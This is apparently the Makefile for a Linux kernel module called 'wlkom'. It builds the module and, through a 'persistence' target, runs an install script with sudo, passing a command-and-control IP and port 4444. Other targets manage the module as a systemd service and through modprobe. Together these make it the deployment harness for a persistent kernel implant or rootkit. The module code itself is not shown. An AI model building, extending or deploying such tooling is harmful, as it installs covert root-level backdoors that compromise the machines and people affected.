KERNELDIR = /lib/modules/$(shell uname -r)/build
PWD = $(shell pwd)
C2_IP ?= 192.168.100.10
C2_PORT ?= 4444
SERVICE = wlkom.service
obj-m = wlkom.o

.PHONY: modules clean persistence install-persistence start stop restart status unload uninstall logs

modules:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) $@

clean:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) $@

persistence install-persistence: modules
	sudo ./install_persistence.sh $(C2_IP) $(C2_PORT)
	$(MAKE) restart

start:
	sudo systemctl start $(SERVICE)

stop:
	sudo systemctl stop $(SERVICE)

restart:
	sudo systemctl restart $(SERVICE)

status:
	sudo systemctl --no-pager status $(SERVICE)

unload:
	sudo modprobe -r wlkom || sudo rmmod wlkom

uninstall:
	sudo systemctl disable --now $(SERVICE) || true
	sudo modprobe -r wlkom || sudo rmmod wlkom || true
	sudo rm -f /etc/systemd/system/$(SERVICE)
	sudo rm -f /etc/modprobe.d/wlkom.conf
	sudo rm -f /lib/modules/$(shell uname -r)/extra/wlkom.ko
	sudo systemctl daemon-reload
	sudo depmod -a

logs:
	sudo journalctl -k -f
